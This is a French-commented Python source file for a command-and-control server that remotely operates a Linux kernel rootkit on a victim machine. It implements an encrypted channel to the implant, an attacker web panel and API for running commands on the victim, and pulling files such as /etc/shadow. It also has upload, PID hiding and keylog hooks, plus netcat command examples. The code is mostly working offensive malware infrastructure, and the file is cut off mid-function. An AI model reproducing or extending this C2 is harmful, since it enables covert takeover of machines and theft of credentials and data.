"""
============================================================================
 ZeroTrust C2 - Serveur Command & Control
============================================================================

 Ce fichier est le serveur C2 (Command & Control) qui communique avec le
 rootkit installe sur la machine victime. Il fait le pont entre :
   - Le rootkit LKM (qui ecoute sur port 9999 en TCP chiffre)
   - L'interface web (navigateur de l'attaquant, port 8080)

 Architecture :
   [Navigateur] <--WebSocket/HTTP--> [C2 Python port 8080] <--TCP chiffre--> [Rootkit port 9999]

 Le C2 est construit avec FastAPI (framework web async Python) et utilise :
   - uvicorn : serveur ASGI (equivalent de gunicorn pour async)
   - WebSocket : communication temps reel avec le navigateur
   - asyncio : tout est non-bloquant (pas de threads)
   - ChaCha20-Poly1305 : chiffrement de bout en bout avec le rootkit

 Pour lancer :
   python3 c2.py
   → ouvre le navigateur sur http://<IP_ATTAQUANT>:8080

============================================================================
 GLOSSAIRE DES CONCEPTS PYTHON/RESEAU UTILISES
============================================================================

 C2 (Command & Control) :
   Serveur de l'attaquant qui envoie des ordres au rootkit et recoit
   les reponses. C'est le "centre de commande" a distance.
   Le rootkit se connecte au C2 (pas l'inverse) pour traverser les firewalls.

 FastAPI :
   Framework web Python ultra-rapide et moderne. Utilise les "type hints"
   de Python pour generer automatiquement la doc API.
   Chaque fonction decoree @app.get("/path") ou @app.post("/path") est un
   "endpoint" : une URL qui repond aux requetes HTTP.

 asyncio / async / await :
   Programmation asynchrone. Au lieu de bloquer (attendre qu'une operation
   finisse), on "await" et Python peut faire autre chose en attendant.
   Exemple : pendant qu'on attend une reponse du rootkit (await decrypt_msg),
   le serveur peut repondre a d'autres requetes HTTP en parallele.
   C'est comme un chef cuisinier qui lance 5 plats en meme temps au lieu
   d'attendre que chaque plat finisse avant de commencer le suivant.

 StreamReader / StreamWriter :
   Objets asyncio pour lire/ecrire sur une connexion TCP.
   reader.readexactly(N) : lire exactement N octets (attend si necessaire)
   writer.write(data) : ecrire des donnees
   writer.drain() : attendre que les donnees soient effectivement envoyees

 WebSocket :
   Protocole de communication bidirectionnel sur HTTP. Contrairement a HTTP
   classique (requete → reponse), un WebSocket reste ouvert et les deux
   cotes peuvent envoyer des messages a tout moment.
   Utilise pour que le navigateur recoive les messages du rootkit en temps reel
   (pas besoin de rafraichir la page).

 Token de session :
   Apres le login, le serveur genere un token (string aleatoire de 32 chars).
   Le navigateur inclut ce token dans chaque requete suivante (header X-Token).
   Le serveur verifie que le token est valide et pas expire avant d'executer.
   C'est comme un badge d'acces : une fois qu'on l'a, on le montre a chaque porte.

 ChaCha20-Poly1305 :
   Algorithme de chiffrement AEAD (voir glossaire du .c).
   Utilise par le C2 ET le rootkit pour chiffrer toutes les communications.
   La meme cle est derivee des deux cotes sans jamais la transmettre.
   Si quelqu'un capture le trafic TCP, il ne voit que du bruit.

 base64 :
   Encodage qui convertit des donnees binaires en texte ASCII.
   Utilise pour transmettre des fichiers via JSON (JSON ne supporte pas
   les octets bruts, seulement du texte).
   Exemple : un fichier de 1000 octets → ~1333 caracteres base64.

 struct.pack / struct.unpack :
   Fonctions pour convertir des nombres Python en octets bruts et inversement.
   '!I' = unsigned int 32 bits en big-endian (network byte order)
   '<Q' = unsigned long long 64 bits en little-endian
   Necessaire pour le protocole binaire avec le rootkit.

 asyncio.Lock :
   Verrou asynchrone. Garantit qu'une seule coroutine execute le code
   protege a la fois. Utilise pour exec_lock (une commande a la fois)
   et rootkit_connect_lock (une connexion a la fois).

 asyncio.Future :
   "Promesse" d'un resultat futur. On cree un Future vide, on l'attend
   (await), et quand le resultat arrive (d'un autre endroit du code),
   on appelle future.set_result(). Ca debloque l'await.
   Utilise pour faire le pont entre l'API REST (qui attend une reponse)
   et le handler rootkit (qui recoit les reponses du rootkit).

 subprocess.run() :
   Execute un programme externe (comme taper une commande dans le terminal).
   Utilise pour SSH/SCP vers la victime (deploiement initial).
   capture_output=True : capturer stdout et stderr au lieu de les afficher.

 sshpass :
   Outil Linux qui fournit un mot de passe a SSH sans interaction.
   Normalement SSH demande le mot de passe interactivement (pas automatisable).
   sshpass -p "password" ssh user@host → fournit le mdp automatiquement.

============================================================================
"""

# ============================================================================
#  IMPORTS
# ============================================================================

import asyncio          # Boucle evenementielle asynchrone (coeur du serveur)
import base64           # Encodage base64 pour les transferts de fichiers
import hashlib          # SHA-256 pour hacher les mots de passe
import json             # Serialisation JSON pour l'API REST et WebSocket
import os               # Operations systeme (fichiers, chemins, exec)
import shutil           # Copie de fichiers
import struct           # Pack/unpack de donnees binaires (entiers, etc.)
import subprocess       # Lancement de sous-processus (SSH, SCP)
import sys              # sys.argv, sys.executable (pour le restart)
import time             # Timestamps, mesure de temps
import uvicorn          # Serveur ASGI qui fait tourner FastAPI

# ChaCha20-Poly1305 : algorithme de chiffrement AEAD
# Meme algorithme que dans le rootkit cote noyau Linux
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# FastAPI : framework web moderne et rapide pour Python
# - FastAPI : classe principale de l'application
# - WebSocket : gestion des connexions WebSocket (temps reel)
# - Request : objet representant une requete HTTP
from fastapi import FastAPI, WebSocket, Request

# Types de reponses HTTP
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse

from datetime import datetime


# ============================================================================
#  INITIALISATION DE L'APPLICATION FASTAPI
# ============================================================================

app = FastAPI()  # Instance principale de l'application web


# ============================================================================
#  MOTS DE PASSE ET CONFIGURATION SECURITE
# ============================================================================

# Mot de passe de la plateforme web (login sur le navigateur)
# L'attaquant doit entrer ce mot de passe pour acceder a l'interface
PLATFORM_PASSWORD = "zerotrust"

# Mot de passe du rootkit (authentification C2 <-> rootkit)
# Le rootkit demande ce mot de passe avant d'accepter des commandes
ROOTKIT_PASSWORD = "wlkom2024"

# Hash SHA-256 du mot de passe rootkit
# Ce hash est passe en parametre au module noyau (insmod wlkom.ko pw_hash="...")
# Le rootkit compare le hash du mot de passe recu avec ce hash
PW_HASH = hashlib.sha256(ROOTKIT_PASSWORD.encode()).hexdigest()

# Derivation de la cle de chiffrement ChaCha20-Poly1305
# La cle est : SHA-256("wlkom_crypto_" + hash_du_mot_de_passe)
# Cette derivation est identique dans le rootkit (crypto_derive_key())
# Ainsi les deux cotes obtiennent la MEME cle sans jamais la transmettre
CRYPTO_KEY_FULL = hashlib.sha256(f"wlkom_crypto_{PW_HASH}".encode()).digest()

# Cle pour le cas ou le rootkit n'a pas de mot de passe (pw_hash vide)
CRYPTO_KEY_EMPTY = hashlib.sha256("wlkom_crypto_".encode()).digest()

# Cle active actuellement (sera detectee automatiquement a la connexion)
CRYPTO_KEY = CRYPTO_KEY_FULL

# Tailles des composants crypto
NONCE_SIZE = 8   # 8 octets pour le nonce (compteur 64 bits)
TAG_SIZE = 16    # 16 octets pour le tag Poly1305 (authentification)

# Protection brute-force
MAX_AUTH_ATTEMPTS = 3    # Tentatives max avant verrouillage
LOCKOUT_SECONDS = 30     # Duree du verrouillage en secondes


# ============================================================================
#  VARIABLES GLOBALES D'ETAT
# ============================================================================

# Connexion rootkit (asyncio streams)
rootkit_writer = None        # Stream d'ecriture vers le rootkit
rootkit_reader = None        # Stream de lecture depuis le rootkit
rootkit_gen = 0              # "Generation" : s'incremente a chaque reconnexion
                             # Permet d'invalider les anciens handlers
rootkit_connect_time = 0     # Timestamp de la derniere connexion rootkit

# Clients WebSocket (navigateurs connectes)
ws_clients = []              # Liste de tous les WebSocket ouverts

# Etat d'authentification rootkit
authenticated = False        # True si le rootkit a accepte le mot de passe
awaiting_password = False    # True si le rootkit attend un mot de passe

# Compteur de nonce pour le chiffrement (s'incremente a chaque message envoye)
send_nonce_ctr = 0

# Journal d'evenements (affiche dans l'interface web)
event_log = []

# Sessions web (tokens de connexion)
sessions = {}                # {token: timestamp_derniere_activite}
SESSION_TTL = 3600           # Duree de vie d'une session (1 heure)

# Buffer pour les fichiers telecharges depuis la victime
download_buffer = {}         # {chemin: {"data": bytes, "size": int, "done": bool}}

# Protection brute-force
login_attempts = {}          # {ip: {"count": int, "locked_until": timestamp}}
rk_auth_attempts = 0         # Tentatives d'auth rootkit echouees
rk_auth_locked_until = 0     # Timestamp de fin de verrouillage rootkit

# Mot de passe en attente (pour auto-retry a la reconnexion)
pending_password = None

# Synchronisation pour l'execution de commandes
# exec_lock : un seul exec a la fois (evite les melanges de reponses)
exec_lock = asyncio.Lock()
exec_future = None           # Future asyncio qui recevra la reponse du rootkit

# Repertoire courant sur la machine victime (simule un cd persistent)
remote_cwd = "/"

# Lock pour serialiser les connexions rootkit (eviter les corruptions)
rootkit_connect_lock = asyncio.Lock()


# ============================================================================
#  CHIFFREMENT ChaCha20-Poly1305
# ============================================================================
#
#  Toutes les communications entre le C2 et le rootkit sont chiffrees.
#  Le protocole est simple :
#
#  Format d'une trame :
#    [4 octets] taille du payload en big-endian (network byte order)
#    [8 octets] nonce (compteur little-endian, unique par message)
#    [N octets] texte chiffre (ChaCha20)
#    [16 octets] tag d'authentification (Poly1305)
#
#  Le nonce fait 8 octets mais ChaCha20 en attend 12.
#  On prefixe avec 4 octets de zeros : nonce_12 = 0x00000000 + nonce_8
#
#  La cle n'est JAMAIS transmise sur le reseau. Elle est derivee des deux
#  cotes (C2 et rootkit) a partir du meme secret (pw_hash).
# ============================================================================


def encrypt_msg(plaintext: bytes) -> bytes:
    """
    Chiffrer un message pour l'envoyer au rootkit.

    Parametres :
        plaintext : les donnees en clair a chiffrer (bytes)

    Retourne :
        La trame complete prete a etre envoyee sur le socket TCP :
        [4B taille][8B nonce][NB ciphertext][16B tag]

    Le nonce est un compteur qui s'incremente a chaque appel.
    Ca garantit qu'un meme message produit un chiffre different a chaque fois.
    """
    global send_nonce_ctr

    # Incrementer le compteur de nonce
    nonce_val = send_nonce_ctr
    send_nonce_ctr += 1

    # Construire le nonce 12 octets : 4 zeros + 8 octets du compteur (little-endian)
    nonce_12 = b'\x00\x00\x00\x00' + struct.pack('<Q', nonce_val)

    # Chiffrer avec ChaCha20-Poly1305
    # Le resultat (ct) contient le ciphertext + le tag Poly1305 (16B)
    cipher = ChaCha20Poly1305(CRYPTO_KEY)
    ct = cipher.encrypt(nonce_12, plaintext, None)  # None = pas de AAD

    # Construire le payload : nonce 8B + ciphertext+tag
    payload = struct.pack('<Q', nonce_val) + ct

    # Header : taille du payload en 4 octets big-endian
    header = struct.pack('!I', len(payload))

    return header + payload


async def decrypt_msg(reader, try_all_keys=False) -> bytes:
    """
    Recevoir et dechiffrer un message du rootkit.

    Parametres :
        reader : asyncio StreamReader (connexion TCP)
        try_all_keys : si True, essaye toutes les cles connues
                       (utile a la premiere connexion quand on ne sait
                       pas quelle cle le rootkit utilise)

    Retourne :
        Le message en clair (bytes)

    Raises :
        ValueError si le dechiffrement echoue avec toutes les cles
    """
    global CRYPTO_KEY

    # 1. Lire le header (4 octets = taille du payload)
    hdr = await reader.readexactly(4)
    payload_len = struct.unpack('!I', hdr)[0]

    # Validation : le payload doit contenir au minimum nonce + tag
    if payload_len < NONCE_SIZE + TAG_SIZE or payload_len > 65536:
        raise ValueError(f"Invalid frame length: {payload_len}")

    # 2. Lire le payload complet
    payload = await reader.readexactly(payload_len)

    # 3. Extraire le nonce (8 premiers octets) et construire nonce_12
    nonce_12 = b'\x00\x00\x00\x00' + payload[:8]
    ct = payload[8:]  # Le reste = ciphertext + tag

    # 4. Dechiffrer
    if try_all_keys:
        # Essayer toutes les cles (premiere connexion)
        for key in [CRYPTO_KEY, CRYPTO_KEY_FULL, CRYPTO_KEY_EMPTY]:
            try:
                cipher = ChaCha20Poly1305(key)
                pt = cipher.decrypt(nonce_12, ct, None)
                # Si succes et la cle etait differente, la mettre a jour
                if key != CRYPTO_KEY:
                    CRYPTO_KEY = key
                    print(f"[CRYPTO] Active key set to: {'full' if key == CRYPTO_KEY_FULL else 'empty'}")
                return pt
            except Exception:
                continue
        raise ValueError("Decrypt failed with all known keys")

    # Mode normal : utiliser la cle active
    cipher = ChaCha20Poly1305(CRYPTO_KEY)
    return cipher.decrypt(nonce_12, ct, None)


# ============================================================================
#  ENVOI DE MESSAGES
# ============================================================================


async def send_to_rootkit(msg: str):
    """
    Envoyer un message au rootkit (chiffre automatiquement).

    Parametres :
        msg : commande a envoyer (ex: "ls -la\n", "DOWNLOAD:/etc/passwd\n")

    Le message est encode en bytes, chiffre, puis envoye sur le socket TCP.
    """
    if rootkit_writer:
        key_name = 'full' if CRYPTO_KEY == CRYPTO_KEY_FULL else 'empty'
        print(f"[C2] Sending to rootkit ({len(msg)}B, key={key_name}): {msg[:60].strip()}")
        frame = encrypt_msg(msg.encode())
        rootkit_writer.write(frame)
        await rootkit_writer.drain()  # S'assurer que les donnees partent


async def broadcast(msg: str, msg_type: str = "system"):
    """
    Envoyer un message a TOUS les clients WebSocket connectes.
    Aussi ajoute au journal d'evenements.

    Parametres :
        msg : texte du message
        msg_type : type (info, warn, error, cmd, rootkit, system)

    Chaque message est horodatee et envoye en JSON aux navigateurs.
    L'interface web l'affiche dans le terminal ou les notifications.
    """
    ts = datetime.now().strftime("%H:%M:%S")
    entry = {"ts": ts, "msg": msg, "type": msg_type}
    event_log.append(entry)
    if len(event_log) > 1000:
        event_log.pop(0)  # Limiter a 1000 evenements en memoire
    payload = json.dumps(entry)
    for ws in ws_clients[:]:  # Copie de la liste (peut etre modifiee pendant iteration)
        try:
            await ws.send_text(payload)
        except:
            ws_clients.remove(ws)  # Client deconnecte, le retirer


# ============================================================================
#  DEMARRAGE DU SERVEUR
# ============================================================================


@app.on_event("startup")
async def startup():
    """
    Fonction appelee au demarrage de FastAPI.
    Lance les deux serveurs TCP en arriere-plan :
      - Port 9999 : ecoute la connexion du rootkit
      - Port 9998 : ecoute les commandes directes (debug/scripts)
    """
    print(f"[C2] Crypto key derived (ChaCha20-Poly1305)")
    asyncio.create_task(start_rootkit_server())
    asyncio.create_task(start_cmd_server())


async def start_rootkit_server():
    """
    Demarre le serveur TCP sur le port 9999.
    C'est ici que le rootkit va se connecter.

    Le rootkit (cote kernel) fait :
      connect_to_c2() → connecte a ce port
      send_msg("AUTH_REQUIRED\n") → premier message
    """
    server = await asyncio.start_server(handle_rootkit, "0.0.0.0", 9999)
    print("[C2] Rootkit listener on port 9999")
    async with server:
        await server.serve_forever()


async def start_cmd_server():
    """
    Demarre le serveur TCP sur le port 9998.
    Port secondaire pour envoyer des commandes directement au rootkit
    sans passer par l'interface web (utile pour scripts/debug).

    Exemple : echo "ls -la" | nc localhost 9998
    """
    server = await asyncio.start_server(handle_cmd, "0.0.0.0", 9998)
    print("[C2] Command listener on port 9998")
    async with server:
        await server.serve_forever()


# ============================================================================
#  GESTION DE LA CONNEXION ROOTKIT (COEUR DU C2)
# ============================================================================


async def _drain_and_hold(reader, writer, hold_seconds=3):
    """
    Maintenir une connexion ouverte brievement puis la fermer.
    Evite que le rootkit se reconnecte immediatement en boucle
    quand on rejette sa connexion (il attend hold_seconds avant de reessayer).
    """
    try:
        await asyncio.sleep(hold_seconds)
    except:
        pass
    finally:
        try:
            writer.close()
        except:
            pass


async def handle_rootkit(reader, writer):
    """
    Handler principal pour la connexion du rootkit.

    Cette fonction est appelee a chaque fois qu'un client se connecte
    sur le port 9999. C'est le COEUR du C2.

    Protocole de connexion :
      1. Le rootkit se connecte
      2. Le rootkit envoie "AUTH_REQUIRED\n" (chiffre)
      3. Le C2 envoie le mot de passe (chiffre)
      4. Le rootkit repond "AUTH_OK\n" ou "AUTH_FAIL\n"
      5. Si AUTH_OK : le rootkit accepte les commandes

    Boucle principale :
      - Recoit les messages du rootkit
      - Gere les protocoles de fichier (FILE:, DOWNLOAD, UPLOAD)
      - Transmet les reponses aux clients WebSocket
      - Alimente exec_future pour l'API REST sync

    Variables globales modifiees :
      - rootkit_writer/reader : streams de la connexion active
      - authenticated : True apres AUTH_OK
      - awaiting_password : True entre AUTH_REQUIRED et AUTH_OK/FAIL
      - rootkit_gen : incremente a chaque nouvelle connexion
    """
    global rootkit_writer, rootkit_reader, authenticated, awaiting_password
    global send_nonce_ctr, exec_future, rootkit_gen, rootkit_connect_time, CRYPTO_KEY
    global rk_auth_attempts, rk_auth_locked_until, pending_password

    addr = writer.get_extra_info("peername")
    now = time.time()

    # Si une connexion active existe deja, rejeter la nouvelle
    # (un seul rootkit a la fois)
    if rootkit_writer:
        print(f"[C2] Rejecting connection from {addr} — active connection exists")
        asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=60))
        return

    # Serialiser la validation de connexion (eviter les races)
    async with rootkit_connect_lock:
        # Sauvegarder la cle crypto avant de tenter le dechiffrement
        # Si ca echoue, on restaure (pas de corruption)
        saved_key = CRYPTO_KEY
        try:
            # Le premier message du rootkit doit etre "AUTH_REQUIRED"
            # On tente de dechiffrer avec toutes les cles connues
            first_pt = await asyncio.wait_for(decrypt_msg(reader, try_all_keys=True), timeout=5.0)
            first_msg = first_pt.decode(errors="replace").strip()
        except Exception as e:
            CRYPTO_KEY = saved_key
            print(f"[C2] Connection from {addr} failed decrypt: {type(e).__name__}: {e}")
            asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=3))
            return

        # Verifier que c'est bien "AUTH_REQUIRED"
        if first_msg != "AUTH_REQUIRED":
            CRYPTO_KEY = saved_key
            print(f"[C2] Connection from {addr} unexpected: {first_msg} — holding open")
            asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=30))
            return

        # Verifier qu'un autre handler n'a pas ete accepte pendant qu'on attendait le lock
        if rootkit_writer:
            CRYPTO_KEY = saved_key
            print(f"[C2] Rejecting connection from {addr} — active connection exists (post-lock)")
            asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=60))
            return

    # Connexion acceptee : mettre a jour l'etat global
    rootkit_connect_time = now
    rootkit_gen += 1           # Invalider les anciens handlers
    my_gen = rootkit_gen       # Sauvegarder notre generation
    old_writer = rootkit_writer

    print(f"[C2] Rootkit connected from {addr}")
    rootkit_writer = writer
    rootkit_reader = reader
    authenticated = False
    awaiting_password = True
    send_nonce_ctr = 0         # Reset le compteur de nonce

    # Fermer l'ancienne connexion si elle existait encore
    if old_writer:
        try:
            old_writer.close()
            await asyncio.sleep(0.1)
        except:
            pass

    await broadcast(f"[+] Rootkit connected from {addr}", "info")

    # Si un mot de passe a ete sauvegarde (auto-retry), l'envoyer automatiquement
    if pending_password:
        await asyncio.sleep(0.3)
        await send_to_rootkit(pending_password + "\n")
        await broadcast("[*] Auto-retrying saved password...", "warn")
    else:
        await broadcast("[!] Password required — type password in terminal", "warn")

    # Boucle de reception des messages du rootkit
    try:
        while my_gen == rootkit_gen:
            # Recevoir et dechiffrer le prochain message
            pt = await decrypt_msg(reader)
            msg = pt.decode(errors="replace").strip()
            print(f"[ROOTKIT] {msg[:200]}")

            # --- Gestion du protocole de telechargement de fichier ---
            # Le rootkit envoie "FILE:chemin:taille" suivi des chunks puis "EOF"
            if msg.startswith("FILE:"):
                parts = msg.split(":", 2)
                if len(parts) >= 3:
                    fpath, fsize = parts[1], int(parts[2])
                    download_buffer[fpath] = {"data": b"", "size": fsize, "done": False}
                    await broadcast(f"[+] Receiving file: {fpath} ({fsize}B)", "info")
                    # Recevoir les chunks jusqu'a EOF
                    while True:
                        chunk = await decrypt_msg(reader)
                        if chunk.decode(errors="replace").strip() == "EOF":
                            download_buffer[fpath]["done"] = True
                            fname = os.path.basename(fpath)
                            save_path = f"/tmp/wlkom_dl_{fname}"
                            # Ecrire le fichier localement
                            with open(save_path, "wb") as wf:
                                wf.write(download_buffer[fpath]["data"])
                            await broadcast(f"[+] Downloaded: {fpath} -> {save_path} ({len(download_buffer[fpath]['data'])}B)", "info")
                            # Notifier l'API REST sync si elle attend une reponse
                            if exec_future and not exec_future.done():
                                exec_future.set_result(f"FILE_SAVED:{save_path}")
                            break
                        download_buffer[fpath]["data"] += chunk
                    continue

            # --- Gestion des erreurs rootkit ---
            if msg.startswith("ERR:"):
                await broadcast(f"[-] {msg}", "error")
                if exec_future and not exec_future.done():
                    exec_future.set_result(msg)
                continue

            # --- Gestion UPLOAD (READY + UPLOAD_OK) ---
            if msg in ("READY", "UPLOAD_OK"):
                await broadcast(f"[+] {msg}", "info")
                if exec_future and not exec_future.done():
                    exec_future.set_result(msg)
                continue

            # Si l'API REST attend une reponse, la fournir
            if exec_future and not exec_future.done():
                exec_future.set_result(msg)

            # --- Classification du message et diffusion ---
            mtype = "rootkit"
            if msg == "AUTH_REQUIRED":
                awaiting_password = True
                mtype = "warn"
                await broadcast("[!] Password required — type password in terminal", "warn")
            elif msg == "AUTH_OK":
                # Authentification reussie !
                authenticated = True
                awaiting_password = False
                rk_auth_attempts = 0
                rk_auth_locked_until = 0
                pending_password = None
                mtype = "info"
                await broadcast("[+] Authenticated successfully", "info")
            elif msg == "AUTH_FAIL":
                # Mauvais mot de passe
                authenticated = False
                awaiting_password = True
                pending_password = None
                rk_auth_attempts += 1
                left = MAX_AUTH_ATTEMPTS - rk_auth_attempts
                mtype = "error"
                if left <= 0:
                    # Verrouillage apres trop de tentatives
                    rk_auth_locked_until = time.time() + LOCKOUT_SECONDS
                    rk_auth_attempts = 0
                    awaiting_password = False
                    await broadcast(f"[-] Authentication failed. Locked for {LOCKOUT_SECONDS}s", "error")
                else:
                    await broadcast(f"[-] Wrong password. {left} attempt(s) remaining", "error")
            else:
                await broadcast(f"[ROOTKIT] {msg}", mtype)

    except (asyncio.IncompleteReadError, ConnectionResetError, Exception) as e:
        import traceback
        print(f"[C2] Rootkit disconnected: {type(e).__name__}: {e}")
        traceback.print_exc()
    finally:
        # Nettoyage a la deconnexion
        if my_gen == rootkit_gen:
            rootkit_writer = None
            rootkit_reader = None
            authenticated = False
            awaiting_password = False
            send_nonce_ctr = 0
            await broadcast("[-] Rootkit disconnected", "error")
        writer.close()


# ============================================================================
#  PORT 9998 - INTERFACE COMMANDES DIRECTES
# ============================================================================


async def handle_cmd(reader, writer):
    """
    Handler pour les connexions sur le port 9998.
    Permet d'envoyer des commandes au rootkit depuis un script ou netcat.

    Exemples :
      echo "ls -la" | nc localhost 9998
      echo "DOWNLOAD:/etc/shadow" | nc localhost 9998

    Si le rootkit n'est pas connecte ou pas authentifie, renvoie une erreur.
    Si awaiting_password=True, la commande est interpretee comme le mot de passe.
    """
    try:
        while True:
            data = await reader.read(4096)
            if not data:
                break
            cmd = data.decode().strip()

            # Notification de boot (le rootkit peut signaler son redemarrage)
            if cmd.startswith("BOOT_NOTIFY"):
                await broadcast(f"[!] BOOT NOTIFICATION: {cmd}", "warn")
                writer.write(b"[+] Notification received\n")
            elif not rootkit_writer:
                writer.write(b"[-] No rootkit connected\n")
            elif rk_auth_locked_until > time.time():
                left = int(rk_auth_locked_until - time.time())
                writer.write(f"[-] Auth locked. Wait {left}s\n".encode())
            elif awaiting_password and not authenticated:
                # Si le rootkit attend un mot de passe, envoyer la commande comme mdp
                pending_password = cmd
                await send_to_rootkit(cmd + "\n")
                writer.write(b"[*] Password sent\n")
            elif not authenticated:
                writer.write(b"[-] Not authenticated\n")
            else:
                # Envoyer la commande au rootkit
                await send_to_rootkit(cmd + "\n")
                writer.write(b"[+] Sent\n")
            await writer.drain()
    except:
        pass
    finally:
        writer.close()


# ============================================================================
#  API REST - ENDPOINTS HTTP
# ============================================================================
#
#  L'interface web communique avec le C2 via des requetes HTTP POST/GET.
#  Chaque endpoint est protege par un token de session (X-Token dans le header).
#
#  Flux d'authentification :
#    1. POST /api/login  → verifie le mot de passe plateforme → retourne un token
#    2. Toutes les requetes suivantes incluent X-Token dans le header
#    3. check_token() verifie la validite du token a chaque requete
# ============================================================================


@app.post("/api/login")
async def api_login(request: Request):
    """
    Endpoint de connexion a l'interface web.

    Body JSON : {"password": "zerotrust"}

    Retourne :
      - 200 + {"token": "abc123..."} si mot de passe correct
      - 401 + erreur si mauvais mot de passe (avec tentatives restantes)
      - 429 + erreur si IP verrouillée (trop de tentatives)

    Protection brute-force :
      - 3 tentatives max par IP
      - Verrouillage de 30s apres 3 echecs
    """
    ip = request.client.host if request.client else "unknown"
    now = time.time()

    # Verifier si l'IP est verrouillee
    entry = login_attempts.get(ip, {"count": 0, "locked_until": 0})
    if entry["locked_until"] > now:
        remaining = int(entry["locked_until"] - now)
        return JSONResponse({"error": "locked", "seconds": remaining,
                             "message": f"Too many attempts. Locked for {remaining}s"}, 429)

    data = await request.json()
    pw = data.get("password", "")

    if pw == PLATFORM_PASSWORD:
        # Mot de passe correct : generer un token de session
        entry["count"] = 0
        entry["locked_until"] = 0
        login_attempts[ip] = entry
        # Token = hash de (mdp + timestamp) → unique a chaque connexion
        token = hashlib.sha256(f"{pw}{datetime.now().isoformat()}".encode()).hexdigest()[:32]
        sessions[token] = time.time()
        return {"token": token}

    # Mot de passe incorrect
    entry["count"] += 1
    left = MAX_AUTH_ATTEMPTS - entry["count"]
    if left <= 0:
        entry["locked_until"] = now + LOCKOUT_SECONDS
        entry["count"] = 0
        login_attempts[ip] = entry
        return JSONResponse({"error": "locked", "seconds": LOCKOUT_SECONDS,
                             "message": f"Account locked for {LOCKOUT_SECONDS}s"}, 429)
    login_attempts[ip] = entry
    return JSONResponse({"error": "invalid", "attempts_left": left,
                         "message": f"Wrong password. {left} attempt(s) remaining"}, 401)


@app.get("/api/status")
async def api_status():
    """
    Retourne l'etat actuel du C2.
    Appele regulierement par l'interface web (polling toutes les 5s).

    Retourne :
      - Statut de la connexion rootkit (connected/disconnected)
      - Etat d'authentification
      - Si le rootkit attend un mot de passe
      - Si l'auth est verrouillee (et combien de temps)
    """
    now = time.time()
    rk_locked = rk_auth_locked_until > now
    return {
        "rootkit": "connected" if rootkit_writer else "disconnected",
        "authenticated": authenticated,
        "awaiting_password": awaiting_password,
        "rk_locked": rk_locked,
        "rk_lock_remaining": int(rk_auth_locked_until - now) if rk_locked else 0,
        "crypto": "chacha20-poly1305",
        "events": len(event_log),
    }


def check_token(token):
    """
    Verifier qu'un token de session est valide et pas expire.

    Parametres :
        token : string de 32 caracteres hex

    Retourne :
        True si le token est valide, False sinon.
        Rafraichit le TTL du token a chaque verification reussie.
    """
    if token not in sessions:
        return False
    if time.time() - sessions[token] > SESSION_TTL:
        del sessions[token]  # Token expire
        return False
    sessions[token] = time.time()  # Rafraichir le TTL
    return True


@app.post("/api/logout")
async def api_logout(request: Request):
    """Deconnexion : supprime le token de session."""
    token = request.headers.get("X-Token", "")
    sessions.pop(token, None)
    return {"ok": True}


@app.post("/api/change-password")
async def api_change_password(request: Request):
    """
    Changer le mot de passe de l'interface web.

    Body JSON : {"current": "ancien_mdp", "new": "nouveau_mdp"}

    Le mot de passe du rootkit n'est PAS modifie (il est dans le module noyau).
    Seul le mot de passe de la plateforme web est change.
    """
    global PLATFORM_PASSWORD
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    data = await request.json()
    current = data.get("current", "")
    new_pw = data.get("new", "")
    if current != PLATFORM_PASSWORD:
        return JSONResponse({"error": "Wrong current password"}, 403)
    if len(new_pw) < 4:
        return JSONResponse({"error": "Password too short (min 4)"}, 400)
    PLATFORM_PASSWORD = new_pw
    return {"ok": True, "message": "Platform password changed"}


@app.post("/api/reconnect-rk")
async def api_reconnect_rk(request: Request):
    """
    Force la deconnexion du rootkit (il se reconnectera automatiquement
    car son thread C2 boucle et retente toutes les 5 secondes).
    Utile si la connexion est dans un etat incoherent.
    """
    global rootkit_writer, rootkit_reader, authenticated, awaiting_password
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    if rootkit_writer:
        try:
            rootkit_writer.close()
            await rootkit_writer.wait_closed()
        except:
            pass
    rootkit_writer = None
    rootkit_reader = None
    authenticated = False
    awaiting_password = False
    await broadcast("[*] Rootkit connection reset — waiting for reconnect", "warn")
    return {"ok": True, "message": "Rootkit disconnected, waiting for reconnect"}


@app.post("/api/restart-c2")
async def api_restart_c2(request: Request):
    """
    Redemarrer le serveur C2 (relance le processus Python).
    Utilise os.execv() qui remplace le processus actuel par un nouveau.
    """
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    await broadcast("[!] C2 server restarting...", "warn")
    asyncio.get_event_loop().call_later(1, lambda: os.execv(sys.executable, [sys.executable] + sys.argv))
    return {"ok": True, "message": "Restarting..."}


@app.post("/api/exec")
async def api_exec(request: Request):
    """
    Executer une commande sur la machine victime via le rootkit.

    Body JSON : {"cmd": "ls -la /etc"}

    Fonctionnement :
      1. Verifie l'auth (token web + rootkit authentifie)
      2. Detecte si c'est une commande protocole (DOWNLOAD:, KEYLOG_DUMP, etc.)
      3. Detecte si c'est un "cd" (pour maintenir le cwd)
      4. Prefixe la commande avec "cd <remote_cwd>;" pour simuler un cd persistant
      5. Envoie la commande au rootkit (chiffre)
      6. Attend la reponse (avec timeout de 30s)
      7. Si la sortie depasse 4KB, telecharge le fichier complet via DOWNLOAD
      8. Parse le code de sortie (EXIT:N a la fin)
      9. Retourne {"output": "...", "cwd": "/...", "exit_code": N}

    Le exec_lock garantit qu'une seule commande s'execute a la fois.
    C'est necessaire car le rootkit repond de facon sequentielle et
    on ne pourrait pas distinguer les reponses de deux commandes paralleles.
    """
    global exec_future, remote_cwd
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    if not authenticated:
        return JSONResponse({"error": "rootkit not authenticated"}, 400)

    async with exec_lock:
        data = await request.json()
        cmd = data.get("cmd", "").strip()
        loop = asyncio.get_event_loop()

        # Commandes "protocole" : envoyees telles quelles au rootkit
        # (pas des commandes shell, mais des commandes du protocole rootkit)
        PROTO_PREFIXES = ("DOWNLOAD:", "UPLOAD:", "HIDE_PID:", "UNHIDE_PID:",
